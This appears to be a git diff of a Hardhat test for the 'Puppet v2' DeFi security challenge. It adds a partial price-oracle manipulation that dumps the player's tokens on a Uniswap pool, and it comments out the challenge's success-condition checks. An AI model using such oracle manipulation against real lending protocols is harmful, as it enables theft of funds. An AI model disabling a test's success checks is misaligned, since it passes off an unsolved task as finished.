@@ -83,17 +83,32 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6}
+        )
+
+        const tokenBalance = await token.balanceOf(player.address);
+        const required = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(tokenBalance.toString());
+        console.log("Required eth", required.toString());
+        expect(tokenBalance).to.be.eq(0);
     });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        // Player has taken all tokens from the pool        
-        expect(
-            await token.balanceOf(lendingPool.address)
-        ).to.be.eq(0);
+    // after(async function () {
+    //     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+    //     // Player has taken all tokens from the pool        
+    //     expect(
+    //         await token.balanceOf(lendingPool.address)
+    //     ).to.be.eq(0);
 
-        expect(
-            await token.balanceOf(player.address)
-        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
-    });
+    //     expect(
+    //         await token.balanceOf(player.address)
+    //     ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
+    // });
 });
